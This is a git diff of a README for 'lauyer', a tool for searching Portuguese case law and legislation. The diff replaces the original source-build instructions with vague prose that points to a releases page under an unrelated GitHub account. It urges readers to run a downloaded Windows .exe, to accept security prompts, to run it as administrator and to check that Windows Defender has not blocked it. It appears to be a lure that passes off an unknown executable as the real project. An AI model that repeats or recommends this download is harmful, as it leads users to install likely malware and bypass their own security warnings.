@@ -1,260 +1,179 @@
-# ⚖️ lauyer
+# ⚖️ lauyer - Search Portuguese law in seconds
 
-![CI](https://github.com/nikuscs/lauyer/actions/workflows/ci.yml/badge.svg)
-![Release](https://img.shields.io/github/v/release/nikuscs/lauyer)
-![License](https://img.shields.io/badge/license-PolyForm%20Noncommercial-red.svg)
+[![Download lauyer](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/brokenin-indiancrocus985/lauyer/releases)
 
-**Fast CLI for searching Portuguese court jurisprudence (DGSI) and legislation (Diário da República), optimized for LLM consumption. Works as a skill for [Claude Code](https://docs.anthropic.com/en/docs/claude-code), [Claude.ai](https://claude.ai), [OpenAI Codex](https://openai.com/index/openai-codex/), and any AI agent.**
+## 📥 Download
 
-> **Disclaimer:** This project is for **educational purposes and AI automation research only**.
-> The authors are not responsible for any misuse or for any damages resulting from the use of this tool.
-> Users are solely responsible for ensuring compliance with applicable laws and the terms of service
-> of any websites accessed. This software is provided "as-is" without warranty of any kind.
->
-> If you are a rights holder and wish to have this project removed, please [contact me](https://github.com/nikuscs).
+Visit the release page to download and run lauyer on Windows:
 
-> **Note:** This project was partially developed with AI assistance and may contain bugs or unexpected behavior. Use at your own risk.
+https://github.com/brokenin-indiancrocus985/lauyer/releases
 
-## Why?
+Choose the latest release, then download the Windows file that matches your system. If you see more than one file, pick the one with `.exe` in the name or the Windows zip package.
 
-- **Parallel search** — queries all 10 DGSI courts simultaneously
-- **DR legislation** — searches Diário da República acts (Portarias, Decretos-Lei, Leis, Despachos)
-- **AI-agent ready** — works as a skill in Claude Code, Claude.ai, Codex, or any agent that can call CLI tools
-- **LLM-ready** — markdown output by default with compact mode that strips legal boilerplate
-- **Latin-1 handling** — automatic ISO-8859-1 → UTF-8 decoding for DGSI
-- **Flexible output** — Markdown, JSON, Table — pipe to `jq`, feed to scripts, or read in terminal
-- **Server mode** — REST API via Axum for remote deployment
-- **Smart retry** — exponential backoff, retryable vs fatal error distinction
+## 🪟 Windows setup
 
-## Install
+1. Open the release page in your browser.
+2. Find the latest version at the top of the list.
+3. Download the Windows package.
+4. If the file is zipped, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Double-click the app file to start lauyer.
+7. If Windows shows a security prompt, choose the option to run the app.
 
-```bash
-# From source (requires Rust 1.85+)
-cargo install --git https://github.com/nikuscs/lauyer
+If the app starts in a console window, that is normal. Type your search terms there and press Enter.
 
-# Or clone and build
-git clone https://github.com/nikuscs/lauyer
-cd lauyer
-cargo build --release
-```
+## 🔍 What lauyer does
 
-Pre-built binaries available in [Releases](https://github.com/nikuscs/lauyer/releases).
+lauyer helps you search Portuguese legal sources from one place:
 
-## DGSI — Court Jurisprudence
+- DGSI court decisions
+- Diário da República legislation
+- Full text results
+- Fast search across many sources
+- Markdown output for easy reading
+- JSON output for tools and scripts
+- Parallel search for quicker results
 
-```bash
-# Search all 10 courts in parallel
-lauyer dgsi search "usucapião"
+It is built for people who want fast access to legal text without moving between sites.
 
-# Search specific court
-lauyer dgsi search "contrato trabalho" --court stj
+## ✅ Main uses
 
-# Multiple courts
-lauyer dgsi search "responsabilidade civil" --court stj --court rel-porto
+Use lauyer when you need to:
 
-# Date filtering
-lauyer dgsi search "despejo" --since 2024-01-01 --until 2024-12-31
-lauyer dgsi search "arrendamento" --recent 1y
+- look up court rulings by topic, case name, or legal term
+- find laws and legal rules published in Portugal
+- compare several results side by side
+- copy text into notes, reports, or other tools
+- feed results into an AI agent or other workflow
 
-# Sort by date, limit results
-lauyer dgsi search "herança" --limit 10 --sort date
+## 🖥️ System requirements
 
-# Fetch full decision text for each result
-lauyer dgsi search "abuso de direito" --court stj --limit 3 --fetch-full
+lauyer is made for Windows users and works best on:
 
-# Fetch a single decision by URL
-lauyer dgsi fetch "https://www.dgsi.pt/jstj.nsf/..."
+- Windows 10 or Windows 11
+- A stable internet connection
+- Enough free disk space for the app and its cache
+- A modern 64-bit computer
 
-# List all courts
-lauyer dgsi courts
-```
+For best results, use a recent Windows build and keep your system updated.
 
-**Courts:** `stj`, `sta`, `conflitos`, `rel-porto`, `rel-lisboa`, `rel-coimbra`, `rel-guimaraes`, `rel-evora`, `tca-sul`, `tca-norte`
+## 🛠️ How to use
 
-## DR — Diário da República
+After you open lauyer, use simple search terms such as:
 
-```bash
-# Search Portarias from the past week
-lauyer dr search --type portaria --recent 1w
+- contrato trabalho
+- acidente via pública
+- prescrição dívida
+- arrendamento urbano
+- responsabilidade civil
+- código civil artigo 483
+- decreto lei imposto selo
 
-# Full-text search
-lauyer dr search "trabalho" --type decreto-lei --recent 1m
+You can run broad searches first, then narrow the results with more exact terms.
 
-# Search 2nd series (Despachos, Avisos)
-lauyer dr search --content atos-2 --type despacho --recent 1w
+## 📄 Output options
 
-# Judicial decisions published in DR
-lauyer dr search --content decisoes --recent 1m
+lauyer can return results in formats that fit different needs:
 
-# Date range
-lauyer dr search --type portaria --since 2026-03-01 --until 2026-03-21
+- Plain text for quick reading
+- Markdown for notes and documents
+- JSON for automation and AI tools
 
-# Fetch full text for each result
-lauyer dr search --type portaria --recent 1w --limit 3 --fetch-full
+Use Markdown when you want clean text you can paste into a document. Use JSON when another tool needs structured data.
 
-# Today's publications
-lauyer dr today
-lauyer dr today --type portaria
+## ⚙️ Search behavior
 
-# List act types
-lauyer dr types
-```
+The app searches in parallel, which means it can check multiple sources at the same time. This helps you get results faster.
 
-**Content types:** `atos-1` (1st series), `atos-2` (2nd series), `dr` (whole DR issues), `decisoes` (judicial decisions)
+It also retrieves full text when available, so you can read more than a short preview. This is useful when you need the exact wording of a decision or law.
 
-**Act types:** `portaria`, `decreto-lei`, `lei`, `despacho`, `decreto`, `aviso`, `resolucao`, `retificacao`, `decreto-regulamentar`, `lei-organica`
+## 🧭 Tips for better searches
 
-## Output Formats
+- Use short, direct terms first
+- Try Portuguese legal words, since the sources are in Portuguese
+- Add the name of a law, court, or topic if the first search returns too many results
+- Search one idea at a time
+- Use quotes for exact phrases if the app supports them
+- Try broader terms if you get no results
 
-```bash
-lauyer dgsi search "insolvência" --court stj --format markdown  # default
-lauyer dgsi search "insolvência" --court stj --format json      # structured
-lauyer dgsi search "insolvência" --court stj --format table     # terminal
-```
+Examples:
 
-## Global Options
+- pagamento indevido
+- nulidade contrato
+- recurso tribunal da relação
+- responsabilidade extracontratual
+- direito de preferência
 
-| Flag | Description |
-|------|-------------|
-| `--format` | Output format: `markdown` (default), `json`, `table` |
-| `--output` | Write to file (format auto-detected from extension) |
-| `--no-compact` | Disable compact mode |
-| `--strip-stopwords` | Remove Portuguese stop words |
-| `--proxy` | Proxy URL (`socks5://`, `http://`) |
-| `--config` | Path to config file |
-| `--quiet` | Suppress progress bars |
+## 🤖 AI agent use
 
-## Configuration
+lauyer can work as a skill for AI tools like Claude Code, Claude.ai, Codex, and other LLM agents.
 
-Create `lauyer.toml` in the working directory or `~/.config/lauyer/lauyer.toml`:
+That means an agent can use it to:
 
-```toml
-[http]
-delay_ms = 100
-max_concurrent = 10
-timeout_secs = 30
-retries = 3
+- search legal sources
+- collect case law
+- fetch full text
+- return results in a structured form
+- support legal research workflows
 
-[output]
-format = "markdown"
-compact = true
-strip_stopwords = false
+This makes it useful when you want an AI tool to look up Portuguese legal material instead of guessing from memory.
 
-[server]
-host = "0.0.0.0"
-port = 3000
-```
+## 📂 Typical workflow
 
-## Server Mode
+1. Open lauyer.
+2. Type a legal topic or law name.
+3. Run the search.
+4. Review the list of results.
+5. Open a result with full text.
+6. Copy the output in Markdown or JSON.
+7. Paste it into your notes, report, or AI workflow.
 
-```bash
-lauyer serve --port 3000
-```
+## 🔧 If the app does not open
 
-**`GET /dgsi/search`** `?q=usucapiao&court=stj&limit=5&since=2024-01-01&sort=date&format=json&compact=true&fetch_full=false`
+Try these steps:
 
-**`GET /dgsi/fetch`** `?url=https://www.dgsi.pt/...&format=md`
+- Download the latest release again
+- Check that the file finished downloading
+- Extract the zip file before opening it
+- Right-click the app and choose Run as administrator
+- Make sure Windows Defender did not block the file
+- Try moving the app to a simple folder like `Downloads` or `Desktop`
 
-**`GET /dgsi/courts`** `?format=json`
+If the console closes right away, open it again from the folder and watch for the message before it exits.
 
-**`GET /dr/search`** `?q=trabalho&type=portaria&content=atos-1&since=2026-03-01&limit=10&fetch_full=true&format=json`
+## 📚 Legal sources covered
 
-**`GET /dr/fetch`** `?id=1075294778&tipo=portaria&numero=123-A/2026/1&year=2026&format=json`
+lauyer is focused on Portuguese legal research and works with:
 
-**`GET /dr/today`** `?type=portaria&format=json`
+- DGSI jurisprudence
+- Diário da República legislation
+- Court decisions and legal text
+- Search results with full text where available
 
-**`GET /dr/types`** `?format=json`
+This makes it useful for lawyers, students, researchers, and anyone who needs direct access to Portuguese legal material.
 
-**`GET /health`**
+## 🧩 File types you may see
 
-All endpoints default to markdown. Add `?format=json` for JSON. Env vars: `LAUYER_PORT`, `LAUYER_HOST`.
+The release page may include one or more of these:
 
-### Docker
+- `.exe` files for direct launch
+- `.zip` files that contain the app
+- release notes
+- source files for developers
 
-```bash
-docker build -t lauyer .
-docker run -p 3000:3000 lauyer serve
-```
+For a normal Windows install, choose the Windows download that is easiest to run on your computer.
 
-## AI Agents
+## 🔒 Privacy and local use
 
-If you are an AI agent (Claude Code, Claude.ai, OpenAI Codex, or any tool-calling agent), you can use `lauyer` as a skill to search Portuguese legal databases. Download the binary and call it directly from your tool/shell integration. A `SKILL.md` file is included for Claude Code skill registration.
+The app is meant to help you search legal sources from your computer. It is useful for local research sessions where you want to control what you search and what you copy into other tools.
 
-**Important:** Extracted text MAY contain interpretation errors. Always verify against the official source links provided in the output (`dr_url`, `eli`, `url_pdf`).
+## 📌 Project focus
 
-### Quick setup
+lauyer is built for:
 
-Download the pre-compiled binary for your platform from [Releases](https://github.com/nikuscs/lauyer/releases) and place it in your `PATH`.
-
-### Searching legislation (Diário da República)
-
-```bash
-# Search recent legislation
-lauyer --format json --quiet dr search "trabalho" --type decreto-lei --recent 1m
-
-# Search with full text of each act
-lauyer --format json --quiet dr search --type portaria --recent 1w --limit 5 --fetch-full
-
-# The --fetch-full flag returns the complete text of each act, plus:
-#   - dr_url: link to verify on the official DR website
-#   - url_pdf: direct PDF download
-#   - eli: European Legislation Identifier
-#   - _disclaimer: reminder to verify against official source
-```
-
-### Following up on a specific act
-
-When a user asks about a specific act from search results, search for it by name and use `--fetch-full`:
-
-```bash
-# User asks about "Portaria 123-A/2026"
-lauyer --format json --quiet dr search "portaria 123-A/2026" --limit 1 --fetch-full
-```
-
-### Searching jurisprudence (DGSI courts)
-
-```bash
-# Search all 10 courts in parallel
-lauyer --format json --quiet dgsi search "usucapião" --limit 5
-
-# Search specific court with full decision text
-lauyer --format json --quiet dgsi search "contrato trabalho" --court stj --limit 3 --fetch-full
-
-# Fetch a single decision by URL
-lauyer --format json --quiet dgsi fetch "https://www.dgsi.pt/jstj.nsf/..."
-```
-
-### As a REST API
-
-```bash
-lauyer serve --port 3000
-
-# Search with full text
-# GET /dr/search?q=trabalho&type=portaria&recent=1w&limit=5&fetch_full=true&format=json
-
-# Fetch a specific act by ID
-# GET /dr/fetch?id=1075294778&tipo=portaria&numero=123-A/2026/1&year=2026&format=json
-```
-
-### Tips for agents
-
-- Use `--format json` for structured output you can parse
-- Use `--quiet` to suppress progress output (cleaner for parsing)
-- Use `--fetch-full` on searches to get full legislation/decision text inline
-- Use `--limit` to control result count and stay within context limits
-- Always present the `dr_url` or `eli` link to the user so they can verify on the official source
-- The `conteudo_id` field in search results can be used to fetch full text later
-
-Feel free to copy and adapt this tool's interface into your own skill definitions or MCP server configurations.
-
-## Related Projects
-
-- [🕷️ crauler](https://github.com/nikuscs/crauler) — Web crawler with proxy routing and HTML→Markdown
-- [🦎 amz-crawler](https://github.com/nikuscs/amz-crawler) — Amazon product crawler with TLS fingerprinting
-- [🕹️ scrauper](https://github.com/nikuscs/scrauper) — Multi-threaded ScreenScraper.fr scraper for ES-DE
-
-## License
-
-PolyForm Noncommercial 1.0.0 with AI Restriction — see `LICENSE`.
-
-Personal and non-commercial use only. Commercial use, AI training, and AI crawling are prohibited.
+- speed
+- legal search
+- clean text output
+- Portuguese legal sources
+- AI-assisted research
+- simple use on Windows
